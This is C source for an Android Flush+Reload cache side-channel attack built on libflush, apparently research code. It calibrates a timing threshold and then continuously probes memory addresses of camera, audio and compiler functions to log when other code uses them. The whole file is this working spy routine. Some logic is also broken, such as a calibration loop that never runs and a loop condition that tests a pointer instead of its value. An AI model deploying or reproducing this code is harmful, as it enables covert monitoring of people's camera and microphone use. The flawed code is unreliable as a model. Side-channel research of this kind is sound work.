/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"
#include "libflush.h"

#ifdef WITH_THREADS
#include <pthread.h>
#include <jni.h>
#include "threads.h"
#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif
#include <android/log.h>
static int shared_data_shm_fd = 0;
#endif

#include "hit.h"
#include "logoutput.h"
#include "calibrate.h"
#define BIND_TO_CPU 0

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))
/* Forward declarations */
static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *g_lock, int compiler_position,int *continueRun,
                         int threshold, int* flags, long* times, int* thresholds, int* logs, int log_length,int sum_length,
                         int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr);
/*
#define TAG_NAME "libflush"
#define log_err(fmt,args...) __android_log_print(ANDROID_LOG_ERROR, TAG_NAME, (const char *) fmt, ##args)
*/

void stage1(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1){
    LOGD("Start stage 1.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    while(*finishtrial1==0) {
        int k = 0;//index of ja
        for (int j = 0; j < 5; j++) {
            int c = j==1?0:1;
            size_t count;
            if(addr[j]!=0&&(j!=camera_audio[0]||j!=camera_audio[1])) {
                count = libflush_reload_address_and_flush(libflush_session, addr[j]);
                if (count <= threshold)
                    LOGD("Target %p.", count);
                continue;
            }
            for (int i = 0; i < length_of_camera_audio[c]; i++) {
                size_t target = *((size_t *) addr[j] + i);
                if (target == 0) {//if the target is 0, skip it.
                    k++;
                    continue;
                }
                count = libflush_reload_address_and_flush(libflush_session, target);
                if (count <= threshold) {
                    if(c==0)
                        LOGD("Camera target %d-%p.", i, target);
                    else
                        LOGD("Audio target %d-%p.", i, target);
                    *((size_t *) addr[j] + i) = 0;//target to 0
                    arr[k] = 1;
                }
                k++;
            }
        }
    }
    LOGD("Finish stage 1.\n");
    libflush_terminate(libflush_session);
}

int hit(pthread_mutex_t *g_lock, int compiler_position,int *continueRun,
        size_t threshold, int* flags, long* times, int* thresholds, int* logs, int log_length, int sum_length,
        int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr)
{
    LOGD("Start.\n");
    for(int j=0;j<sum_length;j++) {
        if (j == 1 || j == 2) {
            int c = j-1;
            for (int i = 0; i < length_of_camera_audio[c]; i++) {
                LOGD("address %d:%p", c, *((size_t*)addr[j]+i));
            }
        }
        LOGD("address:%p", addr[j]);
    }
    /* Initialize libflush */
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    /* Start cache template attack */
    LOGD("[x] Threshold: %zu\n", threshold);
    /* Start slaves */
    attack_slave(libflush_session, g_lock, compiler_position, continueRun,
    threshold, flags, times, thresholds, logs, log_length,sum_length,
    camera_pattern, audio_pattern, length_of_camera_audio, addr);
    /* Terminate libflush */
    libflush_terminate(libflush_session);
    return 0;
}

//get the threshold
size_t get_threshold(){
    LOGD("Start get_threshold.\n");
    /* Initialize libflush */
    size_t threshold = 0;
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    /* Start calibration */
    //if (threshold == 0) {//try to get 3 times
        //fprintf(stdout, "[x] Start calibration... ");
        threshold = calibrate(libflush_session); //get the threshold
        LOGD("Currently the threshold is %d",threshold);

        //check if the threshold is too large
        char buffer[4096] = {0};
        void* address = &buffer[1024];
        //size_t templist[] = {0,0,0,0,0,0,0,0,0,address};//length:10
        int n = 0;
        //scan a address 1 million times to check if the threshold is appropriate
        libflush_reload_address_and_flush(libflush_session,address);
        while(n>10000000){
            uint64_t count = libflush_reload_address_and_flush(libflush_session,address);
            if(count<threshold){
                threshold -= 10;
                n = 0;
            }
            n++;
        }
    //}
    /* Terminate libflush */
    LOGD("Be adjusted to %d.\n",threshold);
    libflush_terminate(libflush_session);
    return threshold;
}


static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *g_lock, int compiler_position,int *continueRun,
        int threshold, int* flags, long* times, int* thresholds, int* logs, int log_length,int sum_length,
        int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr)
{
    struct timeval tv;//for quering time stamp
    int repetitive_hit = 0;//we use the papram to determine whether we should shrink list.
    //gettimeofday(&tv,NULL);
    libflush_init(&libflush_session, NULL);
    /* Run Flush and reload */
    //uint64_t start = libflush_get_timing(libflush_session);
    int turns = 0;
    int length = compiler_position+1;
    LOGD("[x] start scaning %d",compiler_position);
    while(continueRun){
      // if the turns reached 10000 or the same offset was hit more than many times repetitively, shrink the list;
        if(turns>=100000){
	        LOGD("Turns %d",turns);
            length = compiler_position+1;
	        turns = 0;
        }
        //Traverse all addresses
        for(int crt_ofs=0; crt_ofs<length; crt_ofs=crt_ofs+1){
            if(addr[crt_ofs]==0)
                continue;
            int count;
            if(crt_ofs==1||crt_ofs==2){
                int c = crt_ofs==1?0:1;
                pthread_mutex_lock(g_lock);
                for(int i=0;i<length_of_camera_audio[c];i++) {
                    //load the address into cache to count the time, and then flush out
                    //LOGD("11111111111111111 %d",i);
                    if(*((size_t *)addr[crt_ofs] + i)==0) continue;
                    count = libflush_reload_address_and_flush(libflush_session,
                                                              *((size_t *)addr[crt_ofs] + i));
                    if (count <= threshold) {
                        //if it is not a repetitive hit, we change the index.
                        gettimeofday(&tv, NULL);
                        flags[crt_ofs] = 1;//here I have got all functions' activation
                        //LOGD("[%d] cache hit %d %d", crt_ofs, i, count);
                        times[log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                        thresholds[log_length] = count;
                        logs[(log_length)++] = crt_ofs*10000+i;
                        //get the pattern
                        if(crt_ofs==1)
                            camera_pattern[i] = 1;
                        else
                            audio_pattern[i] = 1;
                        if (log_length >= 290000) {
                            LOGD("Log Length is larger than 300000, set it to 0.");
                            log_length = 0;
                        }
                    }
                }
                pthread_mutex_unlock(g_lock);
                //LOGD("22222222222222");
                continue;
            }
            //load the address into cache to count the time, and then flush out
            //LOGD("3333333333333 %d %d",compiler_position,sum_length);
            count = libflush_reload_address_and_flush(libflush_session, addr[crt_ofs]);
            if (count <= threshold) {
                //if it is not a repetitive hit, we change the index.
                gettimeofday(&tv, NULL);
                //LOGD("cache hit %p %d %ld", (void*) (addr[crt_ofs]),count, tv.tv_sec*1000+tv.tv_usec/1000);
                // if current offset is the switch of compiler, expand the list.
                if (crt_ofs == compiler_position - 1) {
                    LOGD("Compiler was activated.");
                    length = sum_length;
                    turns = 0;
                }
                //record the activation
                pthread_mutex_lock(g_lock);
                if (crt_ofs < compiler_position - 1) {
                    flags[crt_ofs] += 1;//here I have got all functions' activation
                    LOGD("cache hit %d %d", crt_ofs, count);
                }
                if (log_length >= 290000) {
                    LOGD("Log Length is larger than 300000, set to 0.");
                    log_length = 0;
                }
                times[log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                thresholds[log_length] = count;
                logs[(log_length)++] = crt_ofs;
                pthread_mutex_unlock(g_lock);
            }
        }//traverse all functions
        turns++;
        usleep(50);//sleep to reduce cpu usage
    }
}


